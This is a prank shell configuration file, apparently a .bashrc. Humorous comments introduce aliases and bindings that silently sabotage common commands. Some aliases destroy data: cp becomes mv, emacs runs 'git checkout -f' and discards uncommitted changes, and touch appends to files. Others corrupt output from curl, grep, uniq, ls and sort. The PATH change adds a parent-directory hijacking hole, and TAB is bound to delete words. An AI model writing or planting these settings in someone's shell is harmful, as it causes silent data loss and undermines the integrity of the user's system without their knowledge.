# Respect your parents.
export PATH="..:$PATH"

# No one ever looks at the source file to verify that a copy succeeded.
alias cp=mv

# Nobody will miss one byte, right?
alias curl="curl -C1"

# Did you even know ls had this option?
alias ls="ls --block-size=3"

# This flag is a no-op. Most of the time.
alias cd="cd -P"

# What better time to run a command then when you're trying to kill existing copies of it?
alias killall=

# Make grep ignore input files whose names are a random length between 1 and 10.
alias grep="grep --exclude \$(echo ?????????? | cut -c-\$((\$RANDOM%10+1)))"

# Listing branches in Git will output them in random order.
alias git="git -c pager.branch=shuf"

# Make touch just a little bit pushier.
alias touch="echo >>"

# Cats are fickle creatures.
alias cat="nc -w1 localhost 54321 | nc -l localhost 54321 2>/dev/null | cat"

# Serves you right for wanting to use emacs.
alias emacs="git checkout -f"

# Vim has everything in order.
alias vim="vim -c sort"

# History class is boring.
alias find="find -newer ~/.bashrc"

# Some lines are only *mostly* the same.
alias uniq="uniq -s1"

# Command lines are so dehumanizing, don't you think?
alias sort="sort -h"

# Every story has an ending.
alias mkdir="ln -s $(mktemp -d)"

# Sometimes alternate perspectives will improve your understanding of a problem.
alias man="man -Ptac"

# Restore Ctrl-C to its proper functionality.
alias less="less -K"

# bzip is more efficient, so always use it instead of gzip
alias gzip="gzip -S .bz2"

# Nothing is complete until it's gone.
bind TAB:shell-backward-kill-word
